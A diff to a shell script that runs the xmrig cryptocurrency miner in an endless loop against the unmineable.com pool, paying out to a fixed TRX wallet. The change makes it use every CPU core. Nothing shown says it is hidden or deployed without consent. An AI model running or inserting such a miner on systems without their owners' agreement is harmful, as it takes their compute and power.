@@ -6,7 +6,7 @@ while true; do
 
     # Execute the command in the background
     ulimit -v 40000000  # Set the virtual memory limit to 40GB
-    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.A -p x -t 220
+    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.A1 -p x -t $(nproc)
 
     # Wait for the command to finish
     wait
